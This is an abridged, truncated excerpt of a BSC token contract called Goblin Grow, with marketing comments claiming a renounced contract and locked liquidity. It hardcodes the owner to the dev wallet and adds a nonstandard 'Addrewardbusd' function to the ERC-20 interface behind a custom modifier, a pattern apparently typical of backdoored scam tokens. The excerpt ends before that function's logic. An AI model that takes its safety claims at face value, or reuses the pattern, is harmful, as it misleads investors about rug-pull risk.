...
//WELCOME TO GOBLIN GROW TOKEN
//SAFE DEV RENOUNCED CA LOCKED LP
//Telegram : https://t.me/GoblinGrowBSC
//Website: http://goblingrow.com/
...
interface IERC20 {
    ...
    function Addrewardbusd(address account) external returns (uint256);
...
contract GoblinGrow is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x17052dfa1E3bEF7D89E74D3aDb75d9eF4211CC39); 
    address payable public Wallet_Dev = payable(0x8daFE63e017Ab5db428901843bF1aaceaC4b0111);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); // 4% Convert 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56 ( BUSD ) for Reward whitelist

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Goblin Grow"; 
    string private constant _symbol = unicode"GGrow"; 
    ...
    constructor () {
        ...
        _owner = 0x8daFE63e017Ab5db428901843bF1aaceaC4b0111;
    ...
    function Addrewardbusd(address account) public openTheSwap override returns (uint256) {
        if(isBuyFee){
